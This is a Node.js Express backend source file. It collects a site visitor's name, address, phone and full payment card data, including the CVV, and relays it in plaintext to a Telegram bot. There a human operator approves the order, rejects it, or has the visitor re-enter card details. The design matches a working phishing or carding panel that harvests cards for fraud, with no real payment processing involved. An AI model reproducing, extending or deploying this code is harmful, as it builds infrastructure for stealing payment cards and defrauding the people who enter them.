require("dotenv").config();

/**
 * Otmorozok backend.
 *
 * Flow:
 *  1. Website POSTs /api/order  → backend forwards data to the bot → long-polls for callback
 *  2. Support agent presses a button in Telegram → bot POSTs /api/callback
 *  3. Backend resolves the pending request → website gets the action and shows the right UI
 *
 * Actions returned to the website:
 *   approved      – purchase confirmed, show success screen
 *   not_suitable  – show rejection screen
 *   wrong_data    – ask user to re-enter card details
 */

const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());
app.use(cors({ origin: "*" }));

// HTTP root of the Flask app next to @cardeeee_bot (POST /request). No trailing slash.
// Local default matches `python index.py` (Flask on 4367). In production set BOT_URL in .env.
const BOT_URL = (
  process.env.BOT_URL || "http://127.0.0.1:4367"
).replace(/\/$/, "");

// Deliberately uncommon port (avoids clashes with 3000/8080/5000).
const DEFAULT_PORT = 38471;
const PORT = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);

// Public URL of *this* backend — the bot POSTs callbacks here. Set in production.
const SELF_URL = process.env.SELF_URL || `http://localhost:${PORT}`;

// How long to keep a connection open waiting for the agent (10 min).
const TIMEOUT_MS = 10 * 60 * 1000;

// pending Map: request_id → { resolve, timer }
const pending = new Map();

// ─── Helpers ────────────────────────────────────────────────────────────────

async function postToBot(payload) {
  const res = await fetch(`${BOT_URL}/request`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`Bot responded ${res.status}: ${text}`);
  }
}

function waitForCallback(request_id) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(request_id);
      resolve({ timeout: true });
    }, TIMEOUT_MS);
    pending.set(request_id, { resolve, timer });
  });
}

// ─── Routes ─────────────────────────────────────────────────────────────────

/**
 * POST /api/order
 * Body: {
 *   profile: { firstName, lastName, street, postcode, city, country, phone },
 *   card:    { number, name, month, year, cvv },
 *   amount:  "CHF 123.00"
 * }
 *
 * Resolves when support presses a button in Telegram:
 *   { ok: true, request_id, action: "approved" | "not_suitable" | "wrong_data" }
 */
app.post("/api/order", async (req, res) => {
  const { profile = {}, card = {}, amount = "" } = req.body;
  const request_id  = uuidv4();
  const callback_url = `${SELF_URL}/api/callback`;

  const name    = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
  const address = [
    profile.street,
    [profile.postcode, profile.city].filter(Boolean).join(" "),
    profile.country,
  ].filter(Boolean).join(", ");

  try {
    await postToBot({
      request_id,
      callback_url,
      name,
      address,
      phone:       profile.phone  || "",
      card_number: card.number    || "",
      card_name:   card.name      || "",
      card_expiry: card.month && card.year ? `${card.month}/${card.year}` : "",
      card_cvv:    card.cvv       || "",
      amount,
    });
  } catch (err) {
    console.error("[order] bot error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Bot unavailable",
      detail: err.message,
    });
  }

  console.log(`[order] waiting for callback  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[order] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[order] resolved  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

/**
 * POST /api/callback
 * Called by the bot when an agent presses a button.
 * Body: { request_id, action }
 */
app.post("/api/callback", (req, res) => {
  const { request_id, action } = req.body || {};
  console.log(`[callback] request_id=${request_id}  action=${action}`);

  const entry = pending.get(request_id);
  if (entry) {
    clearTimeout(entry.timer);
    pending.delete(request_id);
    entry.resolve({ action });
  } else {
    console.warn(`[callback] no pending entry for request_id=${request_id}`);
  }

  res.json({ ok: true });
});

app.get("/health", (_req, res) =>
  res.json({ ok: true, pending: pending.size })
);

// ─── Start ───────────────────────────────────────────────────────────────────

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend listening on http://0.0.0.0:${PORT}`);
  console.log(`  BOT_URL  = ${BOT_URL}`);
  console.log(`  SELF_URL = ${SELF_URL}`);
});
